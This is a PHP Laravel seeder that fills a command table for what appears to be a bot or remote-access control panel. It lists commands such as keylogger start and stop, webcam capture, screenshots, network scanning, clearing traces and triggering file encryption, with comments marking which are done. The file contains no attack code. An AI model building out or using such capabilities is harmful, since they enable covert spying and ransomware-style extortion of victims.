<?php

namespace Database\Seeders;

use App\Models\Code;
use Illuminate\Database\Seeder;

class CodeSeeder extends Seeder
{
    /**
     * Run the database seeds.
     */
    public function run()
    {
        Code::create([
            'name' => 'Custom Command',
            'description' => '',
            'code' => 'custom',
            'category_id' => 1,
        ]);
        Code::create([
            'name' => 'Upload File from Bot',
            'description' => '',
            'code' => 'upload',
            'category_id' => 1,
        ]); // Need from CLI
        Code::create([
            'name' => 'Download File to Bot',
            'description' => '',
            'code' => 'download',
            'category_id' => 1,
        ]); //Need from CLI
        Code::create([
            'name' => 'Gather System Info',
            'description' => '',
            'code' => 'sysinfo',
            'category_id' => 1,
        ]); //DONE
        Code::create([
            'name' => 'Keylogger Start',
            'description' => '',
            'code' => 'keylogger_start',
            'category_id' => 1,
        ]); //DONE
        Code::create([
            'name' => 'Keylogger Stop',
            'description' => '',
            'code' => 'keylogger_stop',
            'category_id' => 1,
        ]); //DONE
        Code::create([
            'name' => 'Take Webcam Snapshot',
            'description' => '',
            'code' => 'webcam',
            'category_id' => 1,
        ]); //DONE
        Code::create([
            'name' => 'Take Screenshot',
            'description' => '',
            'code' => 'screenshot',
            'category_id' => 1,
        ]); //DONE
        Code::create([
            'name' => 'Scan Network',
            'description' => '',
            'code' => 'scan_network',
            'category_id' => 1,
        ]); //DONE
        Code::create([
            'name' => 'Clear Trace',
            'description' => '',
            'code' => 'clear_trace',
            'category_id' => 1,
        ]); //DONE

        Code::create([
            'name' => 'Vulnerability Scan',
            'description' => '',
            'code' => 'vuln_scan',
            'category_id' => 1,
        ]); //From CLI
        Code::create([
            'name' => 'Trigger Encryption',
            'description' => '',
            'code' => 'trigger_encryption',
            'category_id' => 1,
        ]); //From CLI
        Code::create([
            'name' => 'Trigger Decryption',
            'description' => '',
            'code' => 'trigger_decryption',
            'category_id' => 1,
        ]); //From CLI
    }
}
